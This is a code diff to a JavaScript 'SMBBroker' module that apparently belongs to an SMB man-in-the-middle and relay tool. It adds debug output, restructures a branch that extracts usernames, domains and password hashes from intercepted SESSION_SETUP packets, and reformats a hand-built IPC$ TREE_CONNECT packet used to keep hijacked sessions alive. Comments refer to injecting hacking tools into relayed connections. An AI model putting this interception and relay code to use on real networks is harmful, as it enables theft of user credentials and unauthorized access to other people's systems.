@@ -90,7 +90,7 @@ module.exports.SMBBroker = function() {
 	    // been an open resource after 15 minutes (by default), so
 	    // we need to keep the session alive.  We can do this by
 	    // TREE_CONNECTing IPC$ and disconnecting it.  We set the
-	    // Process ID High value to 255 for these "pings" as a
+	    // Process ID value to 0x1165 for these "pings" as a
 	    // marker so the broker can tell when it sees a tree
 	    // connect response that we need to close.  This sends the
 	    // TREE_DISCONNECT.
@@ -111,30 +111,47 @@ module.exports.SMBBroker = function() {
     this.reviewClientPacket = function(packet, server, middler) {
 	middler.freshen();
 	if(packet.commandCode == 0x73) {
-            var n = new smb.CredHunter(packet.buffer);
-	    out.red("Detected username: " + n.username);
-            out.yellow("Hash: " + n.hash);
+            if(middler.getMature()) {
+                // this shouldn't really happen... we shouldn't have
+                // any 0x73s after the connection has matured and
+                // we're jacking in hacking tools.  That said, it
+                // happened a few times that the CredHunter ran and
+                // populated invalid data, so we are trying to figure
+                // out when this happens.  Thus, here is some debug
+                // output in case we run into it again...
 
-            middler.setDomain(n.domain);
-	    middler.setUsername(n.username);
-	    middler.setHostname(n.hostname);
-            middler.setWinVer(n.winver);
-            middler.setHash(n.hash);
-            middler.setHashType(n.htype);
+                out.red("DEBUG: got a command 0x73 (SESSION_SETUP_ANDX) in a mature Middler")
+                out.red("DEBUG: Note, you're FINE... this connection has probably become unusable");
+                out.red("DEBUG: but you haven't hurt a client, so it's not too bad.");
+                out.red("DEBUG: Server:  " + server);
+                out.red("DEBUG: Middler: " + middler);
+                out.red("DEBUG: Packet:  " + packet.buffer);
+            } else {
+                var n = new smb.CredHunter(packet.buffer);
+	        out.red("Detected username: " + n.username);
+                out.yellow("Hash: " + n.hash);
 
-	    // This turns out to be important -- if multiple inbound
-	    // connections come in to an SMB server with the "VC" flag
-	    // set to 0x0000, then the server will kill any previous
-	    // connections.  This happens regardless of username or
-	    // authentication method.  This is obviously uncomfortable
-	    // if we're going to be proxying sessions for lots of IPs.
-	    // If we set this to any non-zero value, this keeps the
-	    // sessions alive.  Amazing how hours of testing yields
-	    // only one line of code.  Accordingly, I thought I'd
-	    // accompany it with this mega-comment to further
-	    // legitimate my efforts.
+                middler.setDomain(n.domain);
+	        middler.setUsername(n.username);
+	        middler.setHostname(n.hostname);
+                middler.setWinVer(n.winver);
+                middler.setHash(n.hash);
+                middler.setHashType(n.htype);
 
-	    packet.buffer.writeUInt16LE(0x1, 45);
+	        // This turns out to be important -- if multiple inbound
+	        // connections come in to an SMB server with the "VC" flag
+	        // set to 0x0000, then the server will kill any previous
+	        // connections.  This happens regardless of username or
+	        // authentication method.  This is obviously uncomfortable
+	        // if we're going to be proxying sessions for lots of IPs.
+	        // If we set this to any non-zero value, this keeps the
+	        // sessions alive.  Amazing how hours of testing yields
+	        // only one line of code.  Accordingly, I thought I'd
+	        // accompany it with this mega-comment to further
+	        // legitimate my efforts.
+
+	        packet.buffer.writeUInt16LE(0x1, 45);
+            }
 	}
 	if(packet.commandCode != 0x74) {
 	    
@@ -202,19 +219,16 @@ module.exports.SMBBroker = function() {
 	    // SMB_ECHO_REQUEST packets don't keep the server alive --
 	    // there needs to be an open resource.  We can do this by
 	    // periodically connecting to the IPC$ tree and then
-	    // disconnecting.  This carrys out the TREE_CONNECT.  This
-	    // shouldn't ultimately be here, since it's
-	    // protocol-specific, but it works for now.  The smbbroker
-	    // takes care of closing the tree when the response comes
-	    // in (it needs to know the TreeID).
+	    // disconnecting.  This carrys out the TREE_CONNECT.  The
+	    // smbbroker takes care of closing the tree when the
+	    // response comes in (it needs to know the TreeID).
 
-            packet = new Buffer("00000054ff534d4275000000001843c8000000000000000000000000ffff65110010040004ff0000000c0001002900005c005c003100320037002e0030002e0030002e0031005c00490050004300240000003f3f3f3f3f00", "hex");
-            // packet = new Buffer("00000054ff534d4275000000000801c8"+
-	    //     		"ff000000000000000000000000ff7910"+
-	    //     		"0008040004ff00000008000100290000"+
-	    //     		"5c005c004c003000430041004c004800"+
-	    //     		"4f00530054005c004900500043002400"+
-	    // 			"00003f3f3f3f3f00", "hex");
+            packet = new Buffer("00000054ff534d4275000000001843c8" +
+                                "000000000000000000000000ffff6511" +
+                                "0010040004ff0000000c000100290000" +
+                                "5c005c003100320037002e0030002e00" +
+                                "30002e0031005c004900500043002400" +
+                                "00003f3f3f3f3f00", "hex");
             out.yellow("User id is " + userid);
             packet.writeUInt16LE(userid, 32);
             server.write(packet);
